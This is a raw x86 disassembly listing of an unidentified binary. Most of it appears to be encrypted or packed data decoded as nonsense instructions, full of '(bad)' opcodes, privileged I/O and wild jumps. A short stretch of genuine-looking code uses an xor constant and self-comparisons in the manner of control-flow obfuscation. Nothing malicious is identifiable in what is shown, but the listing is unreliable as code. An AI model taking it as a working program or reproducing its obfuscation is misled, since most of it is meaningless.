  41c1ec:	jns    0x41c1a4
  41c1ee:	loop   0x41c1d2
  41c1f0:	xchg   edi,eax
  41c1f1:	jb     0x41c233
  41c1f3:	icebp  
  41c1f4:	out    dx,al
  41c1f5:	cdq    
  41c1f6:	sbb    al,0x25
  41c1f8:	mov    ch,0xeb
  41c1fa:	add    BYTE PTR [edi],cl
  41c1fc:	bound  eax,QWORD PTR [edx-0x53c8ca32]
  41c202:	sbb    eax,0xdfbb74f5
  41c207:	loopne 0x41c1fa
  41c209:	adc    DWORD PTR [ebx+0x6c59fbbd],0xffffff82
  41c210:	mov    edx,esi
  41c212:	ins    BYTE PTR es:[edi],dx
  41c213:	push   0x78
  41c215:	sub    edx,ebp
  41c217:	xchg   edx,eax
  41c218:	jo     0x41c211
  41c21a:	loopne 0x41c1e8
  41c21c:	and    DWORD PTR [esp+esi*1+0x55],0x69202032
  41c224:	xor    al,0xef
  41c226:	out    0x9d,al
  41c228:	xchg   ecx,eax
  41c229:	fldenv [eax-0x76]
  41c22c:	add    eax,0x68e63e7b
  41c231:	mov    ch,0x15
  41c233:	push   ebx
  41c234:	ja     0x41c207
  41c236:	sti    
  41c237:	out    dx,al
  41c238:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c23a:	pop    ax
  41c23c:	dec    ecx
  41c23d:	jns    0x41c1fa
  41c23f:	add    BYTE PTR [edi+eiz*2],bl
  41c242:	jle    0x41c21c
  41c244:	js     0x41c226
  41c246:	(bad)  
  41c248:	shl    BYTE PTR [esi-0x6f],0x7b
  41c24c:	repnz cld 
  41c24e:	(bad)  
  41c24f:	frstor [esi]
  41c251:	mov    al,0x2e
  41c253:	xchg   edx,esi
  41c255:	fdiv   st(2),st
  41c257:	mov    BYTE PTR [edi],ah
  41c259:	jae    0x41c2d5
  41c25b:	clc    
  41c25c:	adc    DWORD PTR [esi],0xbc0353c6
  41c262:	dec    esi
  41c263:	or     cl,bl
  41c265:	xchg   bl,ah
  41c267:	adc    al,0x6
  41c269:	or     eax,0x1f8a05f9
  41c26e:	popf   
  41c26f:	sar    BYTE PTR [edx+0x8],1
  41c272:	fist   WORD PTR [ebx+ebp*2+0x45dddbbd]
  41c279:	sbb    DWORD PTR [edi],edi
  41c27b:	adc    eax,0xdeafb3ed
  41c280:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c281:	mov    ebp,0x54d807a5
  41c286:	mov    bl,0xee
  41c288:	and    esi,DWORD PTR [esi*1-0xb917c04]
  41c28f:	cwde   
  41c290:	or     DWORD PTR [esi-0x60],esi
  41c293:	ret    
  41c294:	inc    esi
  41c295:	adc    eax,0xbe3af711
  41c29a:	es mov bh,0x18
  41c29d:	mov    dh,0xfc
  41c29f:	and    ecx,DWORD PTR ds:0x4d45a142
  41c2a5:	inc    esi
  41c2a6:	sbb    DWORD PTR [ecx+0x1c],esp
  41c2a9:	push   ds
  41c2aa:	and    BYTE PTR [edi],0x43
  41c2ad:	data16 xchg cl,dh
  41c2b0:	js     0x41c2a4
  41c2b2:	mov    eax,ds:0x45ba6c67
  41c2b7:	or     eax,ebp
  41c2b9:	jmp    0x15b9d513
  41c2be:	inc    esp
  41c2bf:	je     0x41c33a
  41c2c1:	int    0xf8
  41c2c3:	sbb    eax,0x951f94
  41c2c8:	sub    al,0xf1
  41c2ca:	sub    bl,BYTE PTR [ecx+0x3cca5cd2]
  41c2d0:	pop    edi
  41c2d1:	and    DWORD PTR [ecx],0x63
  41c2d4:	fisttp WORD PTR [ebx-0x4056cc6b]
  41c2da:	outs   dx,DWORD PTR ds:[esi]
  41c2db:	mov    eax,0x13a0e6f4
  41c2e0:	ins    BYTE PTR es:[edi],dx
  41c2e1:	xor    DWORD PTR [eax+0x4777baf4],esp
  41c2e7:	test   eax,0xc631c3bb
  41c2ec:	fldcw  WORD PTR [edx+ecx*2]
  41c2ef:	mov    eax,0xf4ef894e
  41c2f4:	out    0x6e,al
  41c2f6:	ja     0x41c346
  41c2f8:	in     eax,dx
  41c2f9:	aas    
  41c2fa:	mov    ebx,eax
  41c2fc:	or     eax,0xcbeec6b1
  41c301:	js     0x41c381
  41c303:	popf   
  41c304:	ficomp DWORD PTR [ebp-0x54]
  41c307:	(bad)  
  41c308:	jmp    0xea82:0x39f49209
  41c30f:	out    dx,eax
  41c310:	in     eax,dx
  41c311:	enter  0xa3ed,0xd
  41c315:	lock xchg DWORD PTR [edx],edx
  41c318:	pushf  
  41c319:	xor    DWORD PTR [ebx],eax
  41c31b:	cmp    eax,0x4351ac71
  41c320:	and    BYTE PTR [ecx+ebx*1-0x25],bl
  41c324:	shl    DWORD PTR [ecx+eax*8+0x38],cl
  41c328:	mov    ah,0x8e
  41c32a:	fsubr  st,st(0)
  41c32c:	jb     0x41c36f
  41c32e:	pop    ebx
  41c32f:	inc    edx
  41c330:	cdq    
  41c331:	(bad)
  41c334:	xor    eax,0xb20ee4ce
  41c339:	out    0xb1,eax
  41c33b:	or     DWORD PTR [ebx+0x1e],eax
  41c33e:	fwait
  41c33f:	mov    ch,0x8
  41c341:	clc    
  41c342:	jo     0x41c38b
  41c344:	shr    dh,cl
  41c346:	xchg   ch,bh
  41c348:	dec    BYTE PTR [ebx-0x21]
  41c34b:	sar    BYTE PTR [edi-0x5b],0xf
  41c34f:	push   ebx
  41c350:	jmp    0xee2a:0xec87a8e3
  41c357:	jns    0x41c2dd
  41c359:	je     0x41c3d7
  41c35b:	push   0x54
  41c35d:	cmp    BYTE PTR ds:0xfb336428,dh
  41c363:	arpl   WORD PTR [ecx],di
  41c365:	loopne 0x41c35c
  41c367:	fnstcw WORD PTR [ebx-0x2d5e178f]
  41c36d:	mov    BYTE PTR [esi],al
  41c36f:	test   eax,0xb3a2ffc2
  41c374:	ss push edi
  41c376:	iret   
  41c377:	loope  0x41c3ae
  41c379:	test   DWORD PTR [esi-0x77],ecx
  41c37c:	or     eax,0x7b1f41e0
  41c381:	aad    0xb8
  41c383:	jmp    0x6e63:0x969ec27e
  41c38a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c38b:	nop
  41c38c:	push   ss
  41c38d:	les    edx,FWORD PTR [edx-0x8]
  41c390:	adc    BYTE PTR [ebp+esi*1-0x42],cl
  41c394:	icebp  
  41c395:	push   esp
  41c396:	mov    bl,0x7e
  41c398:	arpl   WORD PTR [eax+edi*2+0x7d],bp
  41c39c:	mov    eax,ds:0xaae1677f
  41c3a1:	dec    esp
  41c3a2:	shl    bh,0x36
  41c3a5:	mov    edx,edi
  41c3a7:	repnz mov DWORD PTR [edi],esi
  41c3aa:	xor    eax,0xa3cfb1c
  41c3af:	and    al,0x86
  41c3b1:	pop    esp
  41c3b2:	jb     0x41c42e
  41c3b4:	adc    eax,0x1bd0d251
  41c3b9:	pop    es
  41c3ba:	je     0x41c3e5
  41c3bc:	sbb    DWORD PTR [ebx+0x52],esi
  41c3bf:	and    cl,BYTE PTR ds:0xa7b22d8f
  41c3c5:	not    eax
  41c3c7:	push   es
  41c3c8:	inc    ecx
  41c3c9:	ret    
  41c3ca:	scas   al,BYTE PTR es:[edi]
  41c3cb:	mov    esp,0x336fe494
  41c3d0:	and    BYTE PTR [edi],0x6d
  41c3d3:	push   ecx
  41c3d4:	jle    0x41c401
  41c3d6:	popf   
  41c3d7:	lahf   
  41c3d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3d9:	xchg   ebx,eax
  41c3da:	adc    eax,0xdf9e36dd
  41c3df:	push   0xa9c261e2
  41c3e4:	inc    edi
  41c3e5:	sbb    ebp,0xfffffff3
  41c3e8:	pop    edi
  41c3e9:	or     esi,edi
  41c3eb:	addr16 out 0x93,eax
  41c3ee:	add    ch,BYTE PTR [ebx]
  41c3f0:	or     esp,DWORD PTR [eax]
  41c3f2:	cmp    eax,0xb1fc25e6
  41c3f7:	jnp    0x41c3c0
  41c3f9:	ret    
  41c3fa:	dec    edi
  41c3fb:	aam    0x83
  41c3fd:	mov    fs,esp
  41c3ff:	into   
  41c400:	fidivr DWORD PTR [ebx+edx*8]
  41c403:	jno    0x41c3f6
  41c405:	adc    BYTE PTR [edi+0x38e3649b],ch
  41c40b:	leave  
  41c40c:	in     eax,0x28
  41c40e:	add    al,0x10
  41c410:	fimul  DWORD PTR [eax]
  41c412:	fidivr WORD PTR [esi+edi*8+0x719507cc]
  41c419:	cmp    dh,BYTE PTR [ecx-0x7b]
  41c41c:	lods   eax,DWORD PTR ds:[esi]
  41c41d:	aaa    
  41c41e:	fnstenv [edi]
  41c420:	arpl   dx,bx
  41c422:	sub    esi,ebx
  41c424:	xchg   edx,eax
  41c425:	jne    0x41c456
  41c427:	data16 jnp 0x41c3c7
  41c42a:	mov    WORD PTR [ebx+0x1287d3d5],es
  41c430:	xor    eax,0x6b72392
  41c435:	mov    ds:0x8a487438,al
  41c43a:	mov    esp,0x626d51e2
  41c43f:	push   edx
  41c440:	scas   eax,DWORD PTR es:[edi]
  41c441:	ds dec eax
  41c443:	fldcw  WORD PTR cs:[esi]
  41c446:	iret   
  41c447:	push   edx
  41c448:	push   es
  41c449:	sub    BYTE PTR [esp+eax*8+0x15761eb],bh
  41c450:	mov    esi,0x27b602ce
  41c455:	jg     0x41c4b9
  41c457:	dec    ecx
  41c458:	(bad)  
  41c459:	jl     0x41c442
  41c45b:	pop    ss
  41c45c:	mov    ah,0x3
  41c45e:	push   es
  41c45f:	mov    esi,DWORD PTR [edi+0x4d870cac]
  41c465:	inc    eax
  41c466:	dec    ebp
  41c467:	inc    ecx
  41c468:	xlat   BYTE PTR ds:[ebx]
  41c469:	cmp    BYTE PTR [esi+0x32ac1ff1],dl
  41c46f:	clc    
  41c470:	and    bl,BYTE PTR [ebx-0x42]
  41c473:	cmp    al,0x2d
  41c475:	push   ebx
  41c476:	sbb    BYTE PTR [eax+0x45],al
  41c479:	mov    dl,0x33
  41c47b:	xor    esp,DWORD PTR [eax]
  41c47d:	lods   eax,DWORD PTR ds:[esi]
  41c47e:	mov    cl,0xa9
  41c480:	inc    esi
  41c481:	pop    edx
  41c482:	jbe    0x41c42d
  41c484:	test   DWORD PTR [esi+0x7d],eax
  41c487:	sti    
  41c488:	into   
  41c489:	mov    BYTE PTR [eax+0x1c],0x98
  41c48d:	and    dh,0x66
  41c490:	pushf  
  41c491:	add    eax,0x8e7deae3
  41c496:	dec    ebp
  41c497:	sub    esp,DWORD PTR [eax-0xc]
  41c49a:	mov    dl,0x98
  41c49c:	cdq    
  41c49d:	test   al,0xc2
  41c49f:	cmp    al,0x87
  41c4a1:	push   0xe52c7f52
  41c4a6:	in     al,0xb
  41c4a8:	loope  0x41c48c
  41c4aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4ab:	lea    edx,[edx-0x79f0fb45]
  41c4b1:	gs enter 0xe844,0x1c
  41c4b6:	mov    edi,edi
  41c4b8:	(bad)  
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4bd
  41c4cb:	rep lods eax,DWORD PTR ds:[esi]
  41c4cd:	mov    al,0x4a
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x74581818],bh
  41c4d8:	pusha  
  41c4d9:	xor    DWORD PTR [ebx-0x339e802e],esp
  41c4df:	pop    ss
  41c4e0:	pop    ebp
  41c4e1:	push   ecx
  41c4e2:	imul   eax,DWORD PTR [edi+0x56a157d3],0x2170e9d6
  41c4ec:	jmp    0xdab81805
  41c4f1:	dec    ebx
  41c4f2:	push   ecx
  41c4f3:	fsubr  QWORD PTR [ebx-0x3f]
  41c4f6:	(bad)  
  41c4f7:	imul   ebx,DWORD PTR [esi+0x43a27487],0x34e824e
  41c501:	dec    ebx
  41c502:	add    DWORD PTR [ecx-0x71],esi
  41c505:	fmul   st,st(3)
  41c507:	sub    bl,ch
  41c509:	fld    QWORD PTR [esi-0x697b42f1]
  41c50f:	addr16 popa 
  41c511:	or     al,0xcd
  41c513:	or     DWORD PTR ds:0xed09117f,esi
  41c519:	clc    
  41c51a:	arpl   WORD PTR [edi-0x80],di
  41c51d:	sub    edx,DWORD PTR [ecx-0x41]
  41c520:	leave  
  41c521:	or     DWORD PTR [edi],esi
  41c523:	int    0x3f
  41c525:	dec    edi
  41c526:	sbb    al,cl
  41c528:	loop   0x41c597
  41c52a:	inc    ebx
  41c52b:	rcl    DWORD PTR [esi+0x45],0x81
  41c52f:	ins    DWORD PTR es:[edi],dx
  41c530:	out    0xab,eax
  41c532:	and    ch,dl
  41c534:	dec    edx
  41c535:	inc    eax
  41c536:	fimul  WORD PTR [esp+ebp*1+0x6625b8f6]
  41c53d:	mov    al,0x48
  41c53f:	sbb    cl,dl
  41c541:	mov    ecx,0x12176cd0
  41c546:	xchg   esi,eax
  41c547:	mov    al,0xc0
  41c549:	xchg   eax,ebx
  41c54b:	nop
  41c54c:	jmp    0x2ecb5045
  41c551:	push   es
  41c552:	xchg   ecx,eax
  41c553:	and    ecx,esi
  41c555:	xchg   edi,eax
  41c556:	dec    edi
  41c557:	and    eax,0x6899c9ec
  41c55c:	and    DWORD PTR [eiz*8-0x5ba75d2e],esi
  41c563:	push   edi
  41c564:	or     al,0x76
  41c566:	inc    edi
  41c567:	inc    ebx
  41c568:	sub    esp,DWORD PTR [eax+0x27a18817]
  41c56e:	(bad)  
  41c56f:	xor    DWORD PTR [ecx],edx
  41c571:	or     dh,ah
  41c573:	mov    edi,0xa5e9113
  41c578:	test   al,0x81
  41c57a:	int    0x6
  41c57c:	ja     0x41c5ef
  41c57e:	nop
  41c57f:	(bad)  
  41c580:	popa   
  41c581:	and    ebx,DWORD PTR [edx+0x1c439809]
  41c587:	lods   al,BYTE PTR ds:[esi]
  41c588:	stos   DWORD PTR es:[edi],eax
  41c589:	push   0xffffff95
  41c58b:	ins    DWORD PTR es:[edi],dx
  41c58c:	sbb    eax,0xcc670a0a
  41c591:	pushf  
  41c592:	mov    cl,BYTE PTR [ebx]
  41c594:	test   DWORD PTR [esi-0x5c],0x4ff50dda
  41c59b:	mov    eax,ds:0x1faddd78
  41c5a0:	pop    ebp
  41c5a1:	jne    0x41c544
  41c5a3:	pusha  
  41c5a4:	jl     0x41c52d
  41c5a6:	sub    bh,BYTE PTR [ebx]
  41c5a8:	(bad)  
  41c5a9:	outs   dx,DWORD PTR ds:[esi]
  41c5aa:	sti    
  41c5ab:	into   
  41c5ac:	stc    
  41c5ad:	xlat   BYTE PTR ds:[ebx]
  41c5ae:	mov    bh,0xa3
  41c5b0:	pop    edi
  41c5b1:	aaa    
  41c5b2:	and    al,0xa9
  41c5b4:	in     al,0x4c
  41c5b6:	push   esp
  41c5b7:	pusha  
  41c5b8:	mov    WORD PTR [eax+0x11],?
  41c5bb:	out    0xef,eax
  41c5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5be:	js     0x41c564
  41c5c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5c1:	mov    al,0x15
  41c5c3:	sbb    BYTE PTR [eax-0x75],ah
  41c5c6:	and    al,0x71
  41c5c8:	(bad)  
  41c5c9:	shr    ah,0x2a
  41c5cc:	not    DWORD PTR [ebx+0x23]
  41c5cf:	sbb    ch,ah
  41c5d1:	rol    DWORD PTR [eax-0x8],0xfd
  41c5d5:	pop    ecx
  41c5d6:	pop    es
  41c5d7:	dec    edi
  41c5d8:	ja     0x41c648
  41c5da:	adc    dl,BYTE PTR [edx+0x2c]
  41c5dd:	cdq    
  41c5de:	ins    BYTE PTR es:[edi],dx
  41c5df:	shl    bh,0x4c
  41c5e2:	dec    esp
  41c5e3:	test   BYTE PTR [edi+0x78],0xa4
  41c5e7:	cmp    BYTE PTR [ebx],dh
  41c5e9:	pop    ds
  41c5ea:	or     eax,0x9a13f53d
  41c5ef:	aas    
  41c5f0:	push   es
  41c5f1:	int3   
  41c5f2:	push   eax
  41c5f3:	xchg   edx,eax
  41c5f4:	pop    ss
  41c5f5:	mov    dl,0x1
  41c5f7:	out    dx,eax
  41c5f8:	hlt    
  41c5f9:	xchg   edx,eax
  41c5fa:	cli    
  41c5fb:	lahf   
  41c5fc:	ficom  WORD PTR [edx+ebx*8-0x22]
  41c600:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c601:	mov    edx,0xbc7c5e0
  41c606:	jmp    0x826d9092
  41c60b:	sub    eax,0x2cf6e92f
  41c610:	fwait
  41c611:	xchg   ebp,eax
  41c612:	xchg   edx,eax
  41c613:	xchg   esp,eax
  41c614:	sub    eax,0xae131965
  41c619:	inc    ecx
  41c61a:	xchg   BYTE PTR [ebx],ah
  41c61c:	fnstenv [ecx+0x4eba99b9]
  41c622:	lock push 0x3b
  41c625:	ins    BYTE PTR es:[edi],dx
  41c626:	jnp    0x41c615
  41c628:	jl     0x41c5ce
  41c62a:	fidiv  DWORD PTR [ebx]
  41c62c:	ss scas eax,DWORD PTR es:[edi]
  41c62e:	dec    esp
  41c62f:	cmp    edi,DWORD PTR [ebx]
  41c631:	or     dh,cl
  41c633:	fidiv  WORD PTR [edx]
  41c635:	call   0x6dcbdb2
  41c63a:	push   esp
  41c63b:	inc    eax
  41c63c:	mov    ebx,0xfc4b21d2
  41c641:	cwde   
  41c642:	aaa    
  41c643:	fwait
  41c644:	xlat   BYTE PTR ds:[ebx]
  41c645:	rcl    ebp,0x12
  41c648:	ja     0x41c635
  41c64a:	mov    DWORD PTR [ebp+0x39],edi
  41c64d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c64e:	add    BYTE PTR [ebx],cl
  41c650:	mov    ch,0x62
  41c652:	rcr    bl,0x40
  41c655:	fs xchg edi,eax
  41c657:	stos   BYTE PTR es:[edi],al
  41c658:	es xor al,0x45
  41c65b:	ret    
  41c65c:	pushf  
  41c65d:	push   es
  41c65e:	inc    esp
  41c65f:	pop    eax
  41c660:	mov    al,ds:0x4236aaa0
  41c665:	add    DWORD PTR [ebx],ebp
  41c667:	xchg   ecx,eax
  41c668:	fist   WORD PTR [eax+ebp*8+0x21]
  41c66c:	sti    
  41c66d:	ret    
  41c66e:	adc    BYTE PTR [ecx+edx*4-0x298b8159],ah
  41c675:	mov    ah,0xeb
  41c677:	dec    edi
  41c678:	fisttp DWORD PTR [esi+0x10]
  41c67b:	jmp    0x1ba6363
  41c680:	and    ebx,DWORD PTR [eax+0x18f97586]
  41c686:	inc    eax
  41c687:	push   0x79
  41c689:	(bad)  
  41c68a:	aad    0x3
  41c68c:	pop    edi
  41c68d:	and    al,0xf4
  41c68f:	loope  0x41c665
  41c691:	xchg   edi,eax
  41c692:	test   BYTE PTR [edi+ebp*8+0x58],0xd4
  41c697:	ret    
  41c698:	dec    BYTE PTR [ecx-0x23]
  41c69b:	retf   
  41c69c:	fidivr DWORD PTR [ebx+ebp*2+0x5d]
  41c6a0:	and    eax,0x8602e04b
  41c6a5:	ror    DWORD PTR [edx],cl
  41c6a7:	and    ecx,DWORD PTR [ecx+edx*8+0x58ea9200]
  41c6ae:	sub    ah,BYTE PTR [edi]
  41c6b0:	and    ah,BYTE PTR [esi-0x60]
  41c6b3:	pop    edx
  41c6b4:	add    ebp,DWORD PTR [eax]
  41c6b6:	mov    BYTE PTR ss:[edi-0x6d],dh
  41c6ba:	mov    bh,0x17
  41c6bc:	jmp    0x41c672
  41c6be:	pop    edi
  41c6bf:	mov    edi,0xd8d0f772
  41c6c4:	in     eax,0x2b
  41c6c6:	stos   BYTE PTR es:[edi],al
  41c6c7:	xchg   ecx,eax
  41c6c8:	and    edi,ebp
  41c6ca:	int3   
  41c6cb:	test   eax,0xfcd2f84b
  41c6d0:	xchg   edi,eax
  41c6d1:	mov    ch,0xa1
  41c6d3:	dec    esi
  41c6d4:	jl     0x41c705
  41c6d6:	shl    DWORD PTR [esi-0x62],1
  41c6d9:	jecxz  0x41c6ac
  41c6db:	call   0xa7cc0f9a
  41c6e0:	int    0xed
  41c6e2:	sbb    ecx,eax
  41c6e4:	fild   QWORD PTR [eax-0x3d]
  41c6e7:	(bad)  
  41c6e8:	jg     0x41c6a4
  41c6ea:	add    cl,BYTE PTR [edi]
  41c6ec:	sub    eax,0x7f2b4ccd
  41c6f1:	or     DWORD PTR [ebx],0x8e370736
  41c6f7:	mov    edx,cs
  41c6f9:	push   eax
  41c6fa:	jno    0x41c750
  41c6fc:	dec    eax
  41c6fd:	adc    eax,0xb2e38366
  41c702:	sti    
  41c703:	loopne 0x41c783
  41c705:	sbb    dh,BYTE PTR [ebx-0x4674decc]
  41c70b:	in     eax,dx
  41c70c:	sbb    ecx,edi
  41c70e:	imul   esp,DWORD PTR [edi-0x6d],0x5f756ce2
  41c715:	push   cs
  41c716:	mov    dl,0xba
  41c718:	mov    dl,BYTE PTR [esi]
  41c71a:	ins    BYTE PTR es:[edi],dx
  41c71b:	sbb    eax,0xb9fcab83
  41c720:	push   ebx
  41c721:	and    ebx,DWORD PTR [eax-0x2760b767]
  41c727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c728:	sbb    al,0xb0
  41c72a:	xchg   BYTE PTR [edx],dl
  41c72c:	fistp  WORD PTR [ecx]
  41c72e:	jns    0x41c74e
  41c730:	pusha  
  41c731:	mov    edi,0xe80580f6
  41c736:	test   eax,0xae121da5
  41c73b:	pop    es
  41c73c:	std    
  41c73d:	pop    ds
  41c73e:	imul   esi,DWORD PTR [edi+0xebba734],0x4a
  41c745:	cmp    eax,0xa897ae88
  41c74a:	pop    ebx
  41c74b:	mov    edi,0x5ba60d98
  41c750:	ret    0x7e63
  41c753:	sbb    DWORD PTR [esi],0x68
  41c756:	fwait
  41c757:	push   eax
  41c758:	pop    ebp
  41c759:	ret    
  41c75a:	pop    ds
  41c75b:	cld    
  41c75c:	loope  0x41c7bd
  41c75e:	icebp  
  41c75f:	popa   
  41c760:	sub    eax,DWORD PTR ds:0x15cbc412
  41c766:	shl    BYTE PTR [esi+0x6032684c],1
  41c76c:	mov    eax,0xd9c7d531
  41c771:	ds jl  0x41c7d2
  41c774:	and    al,BYTE PTR [esi]
  41c776:	jp     0x41c70a
  41c778:	frstor [ebx]
  41c77a:	cmp    dl,BYTE PTR [ecx+0x390b7cd5]
  41c780:	lock fdiv st(5),st
  41c783:	out    0x68,al
  41c785:	mov    eax,ds:0xffaa5dd2
  41c78a:	mov    ebp,0xee560c2e
  41c78f:	jle    0x41c783
  41c791:	push   edx
  41c792:	cmp    eax,0xb984f2bc
  41c797:	sar    BYTE PTR [eax-0x54],1
  41c79a:	sub    al,0x1
  41c79c:	shr    DWORD PTR [ebp+0x3cb408b3],1
  41c7a2:	(bad)  
  41c7a3:	adc    esp,DWORD PTR [edx+0x7e1786a4]
  41c7a9:	and    DWORD PTR [edx+0x3],0x1e
  41c7ad:	aam    0x37
  41c7af:	cmp    eax,0x75d5bef6
  41c7b4:	push   esi
  41c7b5:	xchg   edi,eax
  41c7b6:	(bad)  
  41c7b7:	int3   
  41c7b8:	ins    BYTE PTR es:[edi],dx
  41c7b9:	stc    
  41c7ba:	repnz mov ds:0xefca9d78,al
  41c7c0:	bound  esp,QWORD PTR [eax]
  41c7c2:	out    dx,al
  41c7c3:	xchg   edx,eax
  41c7c4:	and    eax,0x8710993b
  41c7c9:	pusha  
  41c7ca:	out    dx,eax
  41c7cb:	pop    ds
  41c7cc:	repnz sub al,0xf6
  41c7cf:	int    0xb9
  41c7d1:	lahf   
  41c7d2:	add    al,0x8c
  41c7d4:	shl    DWORD PTR [edx-0x759d0396],cl
  41c7da:	mov    dl,0x88
  41c7dc:	lea    eax,[ecx+0x5]
  41c7df:	mov    bl,0x4c
  41c7e1:	adc    eax,0x51a7419d
  41c7e6:	out    dx,al
  41c7e7:	jns    0x41c7c9
  41c7e9:	xor    edx,ecx
  41c7eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7ed:	xor    DWORD PTR [ecx-0x42f2e749],esp
  41c7f3:	push   esp
  41c7f4:	sub    DWORD PTR [esi+0x22199910],esi
  41c7fa:	or     eax,0xb1cf5997
  41c7ff:	jb     0x41c789
  41c801:	mov    bl,bh
  41c803:	jl     0x41c806
  41c805:	cs sub eax,0xda991b8d
  41c80b:	out    dx,eax
  41c80c:	adc    ah,cl
  41c80e:	dec    edx
  41c80f:	shr    BYTE PTR [ebx],0xea
  41c812:	pop    ebx
  41c813:	frstor [eax+0x27]
  41c816:	cdq    
  41c817:	push   ebp
  41c818:	call   0x3396ab7
  41c81d:	int3   
  41c81e:	je     0x41c84c
  41c820:	xchg   ebp,eax
  41c821:	into   
  41c822:	inc    ecx
  41c823:	fst    DWORD PTR [eax+eiz*8]
  41c826:	inc    ebx
  41c827:	popf   
  41c828:	inc    esi
  41c829:	sbb    DWORD PTR [ecx],esi
  41c82b:	sbb    al,0x7c
  41c82d:	xor    esi,DWORD PTR [ebx+0x39604c42]
  41c833:	idiv   BYTE PTR [edx]
  41c835:	cs cmp eax,0xdfcabdd9
  41c83b:	push   es
  41c83c:	and    esi,ecx
  41c83e:	adc    al,0x53
  41c840:	(bad)  
  41c842:	cmp    al,0x1b
  41c844:	leave  
  41c845:	mov    bh,BYTE PTR [edx+0x3fb137f]
  41c84b:	int    0xa8
  41c84d:	(bad)  
  41c84e:	iret   
  41c84f:	jae    0x41c8b9
  41c851:	add    edi,ebp
  41c853:	fstp   QWORD PTR [ebx-0x78fd2a42]
  41c859:	and    eax,0x124070cf
  41c85e:	outs   dx,DWORD PTR ds:[esi]
  41c85f:	dec    ebp
  41c860:	rcl    DWORD PTR [edx-0x57],1
  41c863:	gs push esp
  41c865:	daa    
  41c866:	cdq    
  41c867:	add    bl,BYTE PTR [esi]
  41c869:	sub    al,0xd3
  41c86b:	jmp    0x19445877
  41c870:	xchg   ecx,eax
  41c871:	daa    
  41c872:	shl    BYTE PTR [eax],cl
  41c874:	call   0xcd04:0xd5ae4fae
  41c87b:	mov    esi,0xc17641cf
  41c880:	out    dx,al
  41c881:	(bad)
  41c885:	in     eax,0xb9
  41c887:	sti    
  41c888:	push   DWORD PTR [esp+0x74]
  41c88c:	push   DWORD PTR [esp+0x74]
  41c890:	push   DWORD PTR [esp+0x24]
  41c894:	push   DWORD PTR [esp+0x24]
  41c898:	call   0x415a06
  41c89d:	mov    edx,DWORD PTR [esp+0x18]
  41c8a1:	mov    eax,DWORD PTR [esp+0x1c]
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
  41c8f2:	mov    ecx,DWORD PTR [esp+0x68]
  41c8f6:	mov    eax,DWORD PTR [eax]
  41c8f8:	cmp    eax,DWORD PTR [ecx]
  41c8fa:	jne    0x41d531
  41c900:	mov    eax,DWORD PTR [esp+0x5c]
  41c904:	mov    ecx,DWORD PTR [esp+0x5c]
  41c908:	mov    eax,DWORD PTR [eax]
  41c90a:	cmp    eax,DWORD PTR [ecx]
  41c90c:	jne    0x41d531
  41c912:	mov    BYTE PTR [esp+0x2c],0x20
  41c917:	mov    BYTE PTR [esp+0x38],0x3
  41c91c:	mov    BYTE PTR [esp+0x3c],0x6d
  41c921:	mov    BYTE PTR [esp+0x2b],0x90
  41c926:	mov    al,BYTE PTR [esp+0x2b]
  41c92a:	jmp    0x41ccf9
  41c92f:	push   ebp
  41c930:	and    al,0x97
  41c932:	shl    DWORD PTR [esi-0x5e],cl
  41c935:	push   ebp
  41c936:	and    dh,ch
  41c938:	jmp    DWORD PTR [ebx-0x44]
  41c93b:	push   ebx
  41c93c:	in     al,0xa9
  41c93e:	mov    esp,0x18166bef
  41c943:	mov    esp,0xd9181812
  41c948:	sub    dl,BYTE PTR [eax-0x1f]
  41c94b:	cmp    esp,esp
  41c94d:	pop    esi
  41c94e:	inc    esp
  41c94f:	sahf   
  41c950:	mov    ebp,0xa8b13370
  41c955:	mov    bh,0x8f
  41c957:	mov    cl,0xf8
  41c959:	psubsw mm4,QWORD PTR [edx-0x3c3c26fc]
  41c960:	inc    ebx
  41c961:	icebp  
  41c962:	push   eax
  41c963:	jecxz  0x41c8eb
  41c965:	in     al,0xf5
  41c967:	pushf  
  41c968:	pop    esi
  41c969:	lods   eax,DWORD PTR ds:[esi]
  41c96a:	fmul   st(1),st
  41c96c:	call   0x6cb394c5
  41c971:	loop   0x41c9cb
  41c973:	cs pushf 
  41c975:	mov    ebp,0x816d52f6
